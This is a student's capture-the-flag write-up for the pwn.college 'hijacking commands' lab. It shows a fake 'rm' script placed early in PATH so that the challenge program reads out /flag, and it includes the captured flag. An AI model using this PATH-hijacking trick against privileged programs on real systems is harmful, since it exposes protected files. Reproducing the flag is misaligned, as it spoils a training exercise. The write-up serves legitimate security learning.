# Challenge Name
hijacking commands

## My solve
**Flag:** `pwn.college{UwXJeNBIV7GKVw2Cw6d7n9SaZ8F.QX3cjM1wyN0gjNzEzW}`

```bash
Connected!
hacker@path~hijacking-commands:~$ mkdir -p /home/hacker/bin
cat > /home/hacker/bin/rm <<'EOF'
#!/bin/bash
if [ -r /flag ]; then
  read -r FLAG < /flag
  printf '%s\n' "$FLAG"
else
  for f in "$@"; do
    printf '(no /flag; argument: %s)\n' "$f" >&2
  done
fi
exit 0
EOF
chmod +x /home/hacker/bin/rm
PATH=/home/hacker/bin /challenge/run
Trying to remove /flag...
pwn.college{UwXJeNBIV7GKVw2Cw6d7n9SaZ8F.QX3cjM1wyN0gjNzEzW}
```
## Incorrect tangents I went on
I didnt change path correctly to hijack the remove command

## What I learned
I learned to delete certain commands by just changing the path

## References 
None
